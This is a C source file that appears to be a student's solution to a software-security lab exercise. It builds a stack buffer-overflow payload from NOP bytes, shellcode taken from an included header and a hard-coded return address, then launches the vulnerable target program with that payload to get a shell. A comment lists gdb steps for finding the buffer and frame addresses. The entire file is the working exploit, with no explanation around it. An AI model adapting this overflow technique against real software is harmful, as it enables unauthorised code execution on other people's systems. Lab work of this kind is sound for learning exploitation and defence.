#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define TARGET_ADDR 0x40a4fe40
#define TARGET_ADDR_0 0x40
#define TARGET_ADDR_1 0xfe
#define TARGET_ADDR_2 0xa4
#define TARGET_ADDR_3 0x40
#define BUFSIZE 140 
#define SHELLSIZE 45
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attackBuffer[BUFSIZE];
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	attackBuffer[BUFSIZE - 4] = TARGET_ADDR_0;
	attackBuffer[BUFSIZE - 3] = TARGET_ADDR_1;
	attackBuffer[BUFSIZE - 2] = TARGET_ADDR_2;
	attackBuffer[BUFSIZE - 1] = TARGET_ADDR_3;
	for (i = 0; i < SHELLSIZE; i++){
		attackBuffer[i] = shellcode[i];
	}
	//attackBuffer[BUFSIZE] = '\0';

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
/*
set follow-fork-mode child
b main
run
c
b lab_main
c
info frame
p &buf

set {int}0x40a4fecc = 0

*/